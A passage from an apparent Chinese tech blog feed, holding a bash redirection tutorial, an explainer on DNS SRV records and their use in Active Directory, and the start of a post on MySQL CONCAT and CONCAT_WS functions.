<p>我们可以看到后三个文件其实是个链接，指向内核的文件描述符 0\1\2</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">lrwxrwxrwx <span class="m">1</span> root root         <span class="m">15</span> Mar <span class="m">24</span> 16:20 stderr -&gt; /proc/self/fd/2
lrwxrwxrwx <span class="m">1</span> root root         <span class="m">15</span> Mar <span class="m">24</span> 16:20 stdin -&gt; /proc/self/fd/0
lrwxrwxrwx <span class="m">1</span> root root         <span class="m">15</span> Mar <span class="m">24</span> 16:20 stdout -&gt; /proc/self/fd/1
</code></pre></td></tr></table>
</div>
</div><h3 id="特殊的文件描述符">特殊的文件描述符</h3>
<p>在Linux shell中有三个特殊的文件描述符（<code>File descriptor</code> or <code>fd</code>）:</p>
<ul>
<li>fd<code>0</code> 是标准输入: <code>stdin</code></li>
<li>fd<code>1</code> 是标准输出: <code>stdout</code></li>
<li>fd<code>2</code> 是标准错误输出: <code>stderr</code></li>
</ul>
<p>通过这三个特殊的文件描述符我们可以控制输入输出流</p>
<h2 id="重定向">重定向</h2>
<p>我们经常会接触到 <code>&gt;</code> 这个符号，叫做重定向，其实还有另一个符号 <code>&gt;&gt;</code> 有着类似的功能，他们之间有一点小区别：</p>
<ul>
<li><code>&gt;</code> 是覆盖的方式</li>
<li><code>&gt;&gt;</code> 是追加的方式</li>
</ul>
<blockquote>
<p>下面的内容将全部以 <code>&gt;</code> 为例，<code>&gt;&gt;</code> 除了内容是追加之外没有其他区别，就不赘述</p>
</blockquote>
<h2 id="使用重定向">使用重定向</h2>
<h3 id="重定向到文件">重定向到文件</h3>
<p>先来看一下最基本的重定向的使用方法，我们将 <code>echo</code> 命令的输出重定向到一个文件中</p>
<p><code>echo &quot;hello&quot; &gt; a.txt</code></p>
<p>执行结果：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@ubuntu:~# <span class="nb">echo</span> <span class="s2">&#34;hello&#34;</span> &gt; a.txt
root@ubuntu:~# cat a.txt
hello
</code></pre></td></tr></table>
</div>
</div><p>这里是将 <strong>stdout</strong> 重定向到文件 <strong>a.txt</strong> 中，与下面的命令等价</p>
<p><code>echo &quot;hello&quot; 1&gt; a.txt</code></p>
<p>执行结果：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@ubuntu:~# rm a.txt
root@ubuntu:~# <span class="nb">echo</span> <span class="s2">&#34;hello&#34;</span> 1&gt; a.txt
root@ubuntu:~# cat a.txt
hello
</code></pre></td></tr></table>
</div>
</div><p>这里我们看到重定向符号 <code>&gt;</code> 默认是将 <code>stdout</code> 也就是 fd<code>1</code> 重定向到别处</p>
<p>如果我们想要将标准错误输出<code>stderr</code>进行重定向，只需要将上面命令中的文件描述符<code>1</code>修改为标准错误输出的文件描述符<code>2</code>即可</p>
<h3 id="重定向到文件描述符">重定向到文件描述符</h3>
<p>有些情况下 <code>stderr</code> 是会被程序控制写入错误日志的，如果我们想要在命令运行的时候将错误显示在屏幕上，就需要将错误输出重定向到标准输出流中</p>
<p>我们先来尝试一下, 这里我们没有找到一个合适的命令，就拿 <code>ls</code> 命令查看一个不存在的目录，这样会产生错误输出</p>
<blockquote>
<p>这里错误默认是会被输出到屏幕的，只是我暂时没有找到一个更好的程序，我们先假设他不会输出到屏幕</p>
</blockquote>
<p><code>ls error 2&gt;1</code></p>
<p>这里我们的猜想是将 <code>stderr</code> 重定向到 <code>stdout</code>, 所以写了 <code>2&gt;1</code>, 我们来看一下会不会成功？</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@ubuntu:~# ls error 2&gt;1
root@ubuntu:~#
root@ubuntu:~# ls
<span class="m">1</span>
root@ubuntu:~# cat <span class="m">1</span>
ls: cannot access <span class="s1">&#39;error&#39;</span>: No such file or directory
</code></pre></td></tr></table>
</div>
</div><p>我们看到了，并没有输出，而是在当前目录下生成了一个文件 <code>1</code>, 这说明如果我们只写 <code>&gt;1</code> 会被当做重定向到文件 <code>1</code> 中</p>
<p>此时，我们的 <code>&amp;</code> 就要上场了</p>
<p><code>&gt;&amp;</code> 是将一个流重定向到一个文件描述符的语法，所以刚刚我们应该指明要重定向到 fd<code>1</code>, 也就是 <code>&amp;1</code></p>
<p><code>ls error 2&gt;&amp;1</code></p>
<p>执行结果：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@ubuntu:~# ls error 2&gt;<span class="p">&amp;</span><span class="m">1</span>
ls: cannot access <span class="s1">&#39;error&#39;</span>: No such file or directory
</code></pre></td></tr></table>
</div>
</div><blockquote>
<p>到这里我们就可以自主发挥了</p>
</blockquote>
<p>将标准输出重定向到标准错误输出</p>
<p><code>echo &quot;hello&quot; 1&gt;&amp;2</code> or <code>echo &quot;hello&quot; &gt;&amp;2</code></p>
<p>甚至我们可以玩点复杂的</p>
<p><code>(echo &quot;hello&quot; &gt;&amp;9) 9&gt;&amp;2 2&gt;&amp;1</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@ubuntu:~# <span class="o">(</span><span class="nb">echo</span> <span class="s2">&#34;hello&#34;</span> &gt;<span class="p">&amp;</span>9<span class="o">)</span> 9&gt;<span class="p">&amp;</span><span class="m">2</span> 2&gt;<span class="p">&amp;</span><span class="m">1</span>
hello
</code></pre></td></tr></table>
</div>
</div><p>这里的文件描述符<code>9</code>会自动生成，但是去除括号就会提示错误了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@ubuntu:~# <span class="nb">echo</span> <span class="s2">&#34;hello&#34;</span> &gt;<span class="p">&amp;</span><span class="m">9</span> 9&gt;<span class="p">&amp;</span><span class="m">2</span> 2&gt;<span class="p">&amp;</span><span class="m">1</span>
bash: 9: Bad file descriptor
</code></pre></td></tr></table>
</div>
</div><p>在 bash &gt;4.0 的版本中，又出了新的重定向语法</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">$ ls -ld /tmp /tnt 2&gt; &gt;<span class="o">(</span>sed <span class="s1">&#39;s/^/E: /&#39;</span><span class="o">)</span> &gt; &gt;<span class="o">(</span>sed <span class="s1">&#39;s/^/O: /&#39;</span><span class="o">)</span>
O: drwxrwxrwt <span class="m">17</span> root root <span class="m">28672</span> Nov  <span class="m">5</span> 23:00 /tmp
E: ls: cannot access /tnt: No such file or directory
</code></pre></td></tr></table>
</div>
</div><blockquote>
<p>这种写法我还没有学习，等我后面学会了再进行更新</p>
</blockquote>
<h3 id="格式化输出">格式化输出</h3>
<p>来点高端点的用法</p>
<p>用于格式化输出, 将标准输出和错误输出两个流重定向到不同的处理中，最后汇总</p>
<p><code>((ls -ld /tmp /tnt |sed 's/^/O: /' &gt;&amp;9 ) 2&gt;&amp;1 |sed 's/^/E: /') 9&gt;&amp;1| cat -n</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@ubuntu:~# <span class="o">((</span>ls -ld /tmp /tnt <span class="p">|</span>sed <span class="s1">&#39;s/^/O: /&#39;</span> &gt;<span class="p">&amp;</span><span class="m">9</span> <span class="o">)</span> 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span>sed <span class="s1">&#39;s/^/E: /&#39;</span><span class="o">)</span> 9&gt;<span class="p">&amp;</span>1<span class="p">|</span> cat -n
     <span class="m">1</span>  O: drwxrwxrwt <span class="m">1</span> root root <span class="m">4096</span> Mar <span class="m">22</span> 18:59 /tmp
     <span class="m">2</span>  E: ls: cannot access <span class="s1">&#39;/tnt&#39;</span>: No such file or directory
</code></pre></td></tr></table>
</div>
</div><p>相同作用的新版语法</p>
<p><code>cat -n &lt;(ls -ld /tmp /tnt 2&gt; &gt;(sed 's/^/E: /') &gt; &gt;(sed 's/^/O: /'))</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@ubuntu:~# cat -n &lt;<span class="o">(</span>ls -ld /tmp /tnt 2&gt; &gt;<span class="o">(</span>sed <span class="s1">&#39;s/^/E: /&#39;</span><span class="o">)</span> &gt; &gt;<span class="o">(</span>sed <span class="s1">&#39;s/^/O: /&#39;</span><span class="o">))</span>
     <span class="m">1</span>  O: drwxrwxrwt <span class="m">1</span> root root <span class="m">4096</span> Mar <span class="m">22</span> 18:59 /tmp
     <span class="m">2</span>  E: ls: cannot access <span class="s1">&#39;/tnt&#39;</span>: No such file or directory
</code></pre></td></tr></table>
</div>
</div><h3 id="合并文件">合并文件</h3>
<p>将输出文件 m 和 n 合并: <code>n &gt;&amp; m</code></p>
<p>将输入文件 m 和 n 合并: <code>n &lt;&amp; m</code></p>
<h3 id="输入边界">输入边界</h3>
<p>将开始标记 tag 和结束标记 tag 之间的内容作为输入: <code>&lt;&lt; tag</code></p>
<p>例如：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@ubuntu:~# wc -l <span class="s">&lt;&lt; EOF
</span><span class="s">    document line 1
</span><span class="s">    document line 2
</span><span class="s">    document line 3
</span><span class="s">EOF</span>
<span class="m">3</span> //表明收到3行输入
</code></pre></td></tr></table>
</div>
</div><p>它的作用是将两个 EOF 之间的内容(document) 作为输入传递给 command。</p>
<blockquote>
<p>注意：</p>
<ul>
<li>结尾的delimiter 一定要顶格写，前面不能有任何字符，后面也不能有任何字符，包括空格和 tab 缩进</li>
<li>开始的delimiter前后的空格会被忽略掉</li>
</ul>
</blockquote>
<h2 id="有关覆盖">有关覆盖</h2>
<p>如果我们用 <code>set -o noclobber</code> 设置bash，那bash将不会覆盖任何已经存在的文件，但是我们可以通过 <code>&gt;|</code> 绕过这个限制</p>
<p><strong>先来看一下默认的情况</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@ubuntu:~# <span class="nv">testfile</span><span class="o">=</span><span class="k">$(</span>mktemp /tmp/testNoClobberDate-XXXXXX<span class="k">)</span>
root@ubuntu:~# date &gt; <span class="nv">$testfile</span> <span class="p">;</span> cat <span class="nv">$testfile</span>
Tue <span class="m">24</span> Mar <span class="m">2020</span> 05:05:53 PM CST
root@ubuntu:~# date &gt; <span class="nv">$testfile</span> <span class="p">;</span> cat <span class="nv">$testfile</span>
Tue <span class="m">24</span> Mar <span class="m">2020</span> 05:05:56 PM CST
root@ubuntu:~# date &gt; <span class="nv">$testfile</span> <span class="p">;</span> cat <span class="nv">$testfile</span>
Tue <span class="m">24</span> Mar <span class="m">2020</span> 05:06:13 PM CST
</code></pre></td></tr></table>
</div>
</div><p>如预期的一样，每一次重定向都覆盖了原文件</p>
<p><strong>下面我们设置 <code>noclobber</code> 标志</strong></p>
<p><code>set -o noclobber</code></p>
<p>然后重复上面的操作试一下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@ubuntu:~# date &gt; <span class="nv">$testfile</span> <span class="p">;</span> cat <span class="nv">$testfile</span>
bash: /tmp/testNoClobberDate-yKVkaY: cannot overwrite existing file
Tue <span class="m">24</span> Mar <span class="m">2020</span> 05:06:13 PM CST
root@ubuntu:~# date &gt; <span class="nv">$testfile</span> <span class="p">;</span> cat <span class="nv">$testfile</span>
bash: /tmp/testNoClobberDate-yKVkaY: cannot overwrite existing file
Tue <span class="m">24</span> Mar <span class="m">2020</span> 05:06:13 PM CST
</code></pre></td></tr></table>
</div>
</div><p>我们看到了bash的提示，不能覆盖已存在的文件，实际结果也是一样</p>
<p>如何进行绕过呢? 我们来试一下用 <code>&gt;|</code> 代替 <code>&gt;</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@ubuntu:~# date &gt;<span class="p">|</span> <span class="nv">$testfile</span> <span class="p">;</span> cat <span class="nv">$testfile</span>
Tue <span class="m">24</span> Mar <span class="m">2020</span> 05:10:45 PM CST
root@ubuntu:~# date &gt;<span class="p">|</span> <span class="nv">$testfile</span> <span class="p">;</span> cat <span class="nv">$testfile</span>
Tue <span class="m">24</span> Mar <span class="m">2020</span> 05:10:49 PM CST
</code></pre></td></tr></table>
</div>
</div><p>我们发现此时可以覆盖已经存在的文件，我们查看一下目前的设置</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@ubuntu:~# <span class="nb">set</span> -o <span class="p">|</span> grep noclobber
noclobber       on
</code></pre></td></tr></table>
</div>
</div><p><code>noclobber</code> 的确是开启的，所以 <code>&gt;|</code> 的确可以绕过这一限制</p>
<p>使用 <code>set +o noclobber</code> 关闭这个限制，防止对我们后面的使用造成影响</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@ubuntu:~# <span class="nb">set</span> +o noclobber
root@ubuntu:~# <span class="nb">set</span> -o <span class="p">|</span> grep noclobber
noclobber       off
root@ubuntu:~# rm <span class="nv">$testfile</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="其他的小点">其他的小点</h2>
<h3 id="重定向到一处">重定向到一处</h3>
<p>如果我们要将 <code>stdout</code> 和 <code>stderr</code> 重定向到同一个地方，该怎么写呢？</p>
<p>下面两种哪种是对的？</p>
<ol>
<li><code>ls -ld /tmp /tnt 2&gt;&amp;1 1&gt;a.txt</code></li>
<li><code>ls -ld /tmp /tnt 1&gt;b.txt 2&gt;&amp;1</code></li>
</ol>
<p>验证一下</p>
<p><strong>第一种写法</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@ubuntu:~# ls -ld /tmp /tnt 2&gt;<span class="p">&amp;</span><span class="m">1</span> 1&gt;a.txt
ls: cannot access <span class="s1">&#39;/tnt&#39;</span>: No such file or directory
root@ubuntu:~# cat a.txt
drwxrwxrwt <span class="m">1</span> root root <span class="m">4096</span> Mar <span class="m">24</span> 17:15 /tmp
</code></pre></td></tr></table>
</div>
</div><p><strong>第二种写法</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@ubuntu:~# ls -ld /tmp /tnt 1&gt;b.txt 2&gt;<span class="p">&amp;</span><span class="m">1</span>
root@ubuntu:~# cat b.txt
ls: cannot access <span class="s1">&#39;/tnt&#39;</span>: No such file or directory
drwxrwxrwt <span class="m">1</span> root root <span class="m">4096</span> Mar <span class="m">24</span> 17:15 /tmp
</code></pre></td></tr></table>
</div>
</div><p>我们可以看到第二种写法是正确的</p>
<p>同理，下面这种写法也正确</p>
<p><code>ls -ld /tmp /tnt 2&gt;b.txt 1&gt;&amp;2</code></p>
<h3 id="套个娃a">套个娃a</h3>
<p>来点奇葩的，如果我们将 <code>stderr</code> 重定向到 <code>stdout</code>, 同时又将 <code>stdout</code> 重定向到 <code>stderr</code> 会发生什么？</p>
<p>如此套娃会不会导致回环卡死？</p>
<p>试一下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@ubuntu:~# ls -ld /tmp /tnt 2&gt;<span class="p">&amp;</span><span class="m">1</span> 1&gt;<span class="p">&amp;</span><span class="m">2</span>  <span class="p">|</span> sed -e s/^/++/
++ls: cannot access <span class="s1">&#39;/tnt&#39;</span>: No such file or directory
++drwxrwxrwt <span class="m">1</span> root root <span class="m">4096</span> Mar <span class="m">24</span> 17:15 /tmp
</code></pre></td></tr></table>
</div>
</div><p>我们发现都会从标准输出出来</p>
<p>反过来呢？</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@ubuntu:~# ls -ld /tmp /tnt 1&gt;<span class="p">&amp;</span><span class="m">2</span> 2&gt;<span class="p">&amp;</span><span class="m">1</span>  <span class="p">|</span> sed -e s/^/++/
ls: cannot access <span class="s1">&#39;/tnt&#39;</span>: No such file or directory
drwxrwxrwt <span class="m">1</span> root root <span class="m">4096</span> Mar <span class="m">24</span> 17:15 /tmp
</code></pre></td></tr></table>
</div>
</div><p>我们发现都没有从标准输出出来，都是从标准错误输出出来的</p>
<blockquote>
<p>也就是说 <code>a&gt;&amp;b b&gt;&amp;a</code> 这种套娃写法中， b才是出口</p>
</blockquote>
<h2 id="阅读更多内容">阅读更多内容</h2>
<p>如果你想了解功能，通过下面的命令查看官方文档吧</p>
<p><code>man -Len -Pless\ +/^REDIRECTION bash</code></p>
<p>本文的参考资料： <a href="https://stackoverflow.com/questions/818255/in-the-shell-what-does-21-mean" target="_blank" rel="noopener noreffer">stack overflow</a></p>
]]></description></item><item><title>DNS中SRV记录</title><link>https://lgf.im/posts/learn/dns-srv-record/</link><pubDate>Tue, 24 Mar 2020 13:54:03 +0000</pubDate><author/><guid>https://lgf.im/posts/learn/dns-srv-record/</guid><description><![CDATA[<p>SRV记录是服务器资源记录的缩写，是DNS服务器的数据库中支持的一种记录服务器提供的服务资源的记录，主要作用是说明一个服务器能够提供什么样的服务。</p>
<p>简单来说，SRV记录了哪台计算机提供了哪个服务这么一个简单的信息。</p>
<p>SRV记录是DNS记录中的新鲜面孔，在RFC2052中才对SRV记录进行了定义，因此很多老版本的DNS服务器并不支持SRV记录。</p>
<h3 id="rfc2782">RFC2782</h3>
<h4 id="概述和理由">概述和理由</h4>
<p>目前，必须知道服务器的确切地址才能联系它或者广播问题。</p>
<p>SRV RR允许管理员为单个域名使用多个服务器，轻松地将服务从一个主机移动到另一个主机，并将某些主机指定为服务的主服务器，将其他主机指定为备份。</p>
<p>客户端要求特定域名的特定服务/协议（这里使用的词汇&quot;域名&quot;是RFC 1034上严格定义的），并获取任何可用服务器的名称。</p>
<p>请注意，在本文档引用“地址记录”时，它表示A RR，AAAA RR或其最现代的等价物。</p>
<h4 id="rfc定义的格式">RFC定义的格式</h4>
<p>RFC2782中定义的格式是：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">_Service._Proto.Name TTL Class SRV Priority Weight Port Target
</code></pre></td></tr></table>
</div>
</div><p>各字段详细说明：</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>Service</td>
<td>所需服务的符号名称。在Assigned Numbers或本地定义。服务标识符前面加上下划线<code>_</code>，以避免与自然界中出现的DNS标签发生冲突。</td>
</tr>
<tr>
<td>Proto</td>
<td>所需协议的符号名称。前面加下划线<code>_</code>，以防止与自然界中出现的DNS标签发生冲突。 <code>_TCP</code>和<code>_UDP</code>目前是该字段最常用的值，但可以使用由Assigned Numbers或本地定义的任何名称。 Proto不区分大小写。</td>
</tr>
<tr>
<td>Name</td>
<td>此RR所指的域名。在这个域名下SRV RR是唯一的。（英文原文好像有些语法问题）</td>
</tr>
<tr>
<td>TTL</td>
<td></td>
</tr>
<tr>
<td>Class</td>
<td></td>
</tr>
<tr>
<td>Priority</td>
<td></td>
</tr>
<tr>
<td>Weight</td>
<td></td>
</tr>
<tr>
<td>Port</td>
<td>服务在目标主机上的端口。所需协议的符号名称，前面加下划线（_），以防止与自然界中出现的DNS标签发生冲突。 _TCP和_UDP目前是该字段最有用的值，但可以使用由Assigned Numbers定义的任何名称或本地的（如Service）。 Proto不区分大小写。范围是0-65535。 这是网络字节顺序中的16位无符号整数。 通常在Assigned Numbers中指定，但不一定如此。</td>
</tr>
<tr>
<td>Target</td>
<td>目标主机的域名。 域名必须有一个或多个地址记录，域名绝不能是别名。敦促（但不强求）实现在附加数据部分中返回地址记录。除非并且直到将来的标准操作允许，否则名称压缩不能用于此字段。值为“.” 表示该域名明确无法提供该服务。</td>
</tr>
</tbody>
</table>
<h3 id="srv记录和微软的关系">SRV记录和微软的关系</h3>
<p>SRV记录在微软的Active Directory中有着重要地位，大家知道在NT4时代域和DNS并没有太多关系。但从Win2000开始，域就离不开DNS的帮助了，为什么呢？因为域内的计算机要依赖DNS的SRV记录来定位域控制器！微软的即时通讯服务器Live Communications Server也可以依靠SRV记录定位即时通讯服务器。</p>
<p>SRV 记录一般是为Microsoft的活动目录设置时的应用。DNS可以独立于活动目录，但是活动目录必须有DNS的帮助才能工作。为了活动目录能够正常的工作，DNS服务器必须支持服务定位（SRV）资源记录，资源记录把服务名字映射为提供服务的服务器名字。活动目录客户和域控制器使用SRV资源记录决定域控制器的IP地址。</p>
<p>鉴于SRV记录可以定位特定服务器的位置，我们可以预计，在微软将来的服务器产品中SRV记录将发挥越来越多的作用。</p>
]]></description></item><item><title>MySQL中几个concat的用法与区别</title><link>https://lgf.im/posts/security/web-security/mysql-concat-concat-ws-group-concat/</link><pubDate>Sun, 22 Mar 2020 18:23:34 +0000</pubDate><author/><guid>https://lgf.im/posts/security/web-security/mysql-concat-concat-ws-group-concat/</guid><description><![CDATA[<h2 id="讲解与示例">讲解与示例</h2>
<h3 id="concatstr1-str2-">CONCAT(str1, str2, &hellip;)</h3>
<ol>
<li>返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL</li>
<li>参数可以是字段名或具体值</li>
</ol>
<p>注意：</p>
<ol>
<li>如果所有参数均为非二进制字符串，则结果为非二进制字符串</li>
<li>如果自变量中含有任一二进制字符串，则结果为一个二进制字符串</li>
<li>一个数字参数被转化为与之相等的二进制字符串格式</li>
<li>若要避免这种情况，可使用显式类型 cast, 例如： <code>SELECT CONCAT(CAST(int_col AS CHAR), char_col)</code></li>
</ol>
<h4 id="mysql的concat函数可以连接一个或者多个字符串">MySQL的concat函数可以连接一个或者多个字符串</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">mysql&gt; <span class="k">select</span> concat<span class="o">(</span><span class="s1">&#39;10&#39;</span><span class="o">)</span><span class="p">;</span>
+--------------+
<span class="p">|</span> concat<span class="o">(</span><span class="s1">&#39;10&#39;</span><span class="o">)</span> <span class="p">|</span>
+--------------+
<span class="p">|</span> <span class="m">10</span>   <span class="p">|</span>
+--------------+
<span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
mysql&gt; <span class="k">select</span> concat<span class="o">(</span><span class="s1">&#39;11&#39;</span>,<span class="s1">&#39;22&#39;</span>,<span class="s1">&#39;33&#39;</span><span class="o">)</span><span class="p">;</span>
+------------------------+
<span class="p">|</span> concat<span class="o">(</span><span class="s1">&#39;11&#39;</span>,<span class="s1">&#39;22&#39;</span>,<span class="s1">&#39;33&#39;</span><span class="o">)</span> <span class="p">|</span>
+------------------------+
<span class="p">|</span> <span class="m">112233</span> <span class="p">|</span>
+------------------------+
<span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><h4 id="mysql的concat函数在连接字符串的时候只要其中一个是null那么将返回null">MySQL的concat函数在连接字符串的时候，只要其中一个是NULL,那么将返回NULL</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">mysql&gt; <span class="k">select</span> concat<span class="o">(</span><span class="s1">&#39;11&#39;</span>,<span class="s1">&#39;22&#39;</span>,null<span class="o">)</span><span class="p">;</span>
+------------------------+
<span class="p">|</span> concat<span class="o">(</span><span class="s1">&#39;11&#39;</span>,<span class="s1">&#39;22&#39;</span>,null<span class="o">)</span> <span class="p">|</span>
+------------------------+
<span class="p">|</span> NULL   <span class="p">|</span>
+------------------------+
<span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="concat_wsseparatorstr1str2">CONCAT_WS(separator,str1,str2,…)</h3>
<p>CONCAT_WS() 代表 CONCAT With Separator ，是CONCAT()的特殊形式。第一个参数是其它参数的分隔符。分隔符的位置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。</p>
<p>注意：</p>
<ol>
<li>参数可以是字段名或具体值</li>
<li>如果分隔符为 NULL，则结果为 NULL。函数会忽略任何分隔符参数后的 NULL 值。（只保留非空值）</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">mysql&gt; <span class="k">select</span> concat_ws<span class="o">(</span><span class="s1">&#39;&#39;</span>,<span class="s1">&#39;&#39;</span>,<span class="s1">&#39;&#39;</span>,<span class="s1">&#39;33&#39;</span><span class="o">)</span><span class="p">;</span>
+--------------------------+
<span class="p">|</span> concat_ws<span class="o">(</span><span class="s1">&#39;&#39;</span>,<span class="s1">&#39;&#39;</span>,<span class="s1">&#39;&#39;</span>,<span class="s1">&#39;33&#39;</span><span class="o">)</span> <span class="p">|</span>
+--------------------------+
<span class="p">|</span> <span class="m">33</span>                       <span class="p">|</span>
+--------------------------+
<span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.04 sec<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><h4 id="如连接后以逗号分隔">如连接后以逗号分隔</h4>
<div class="highlight"><div class="chroma">
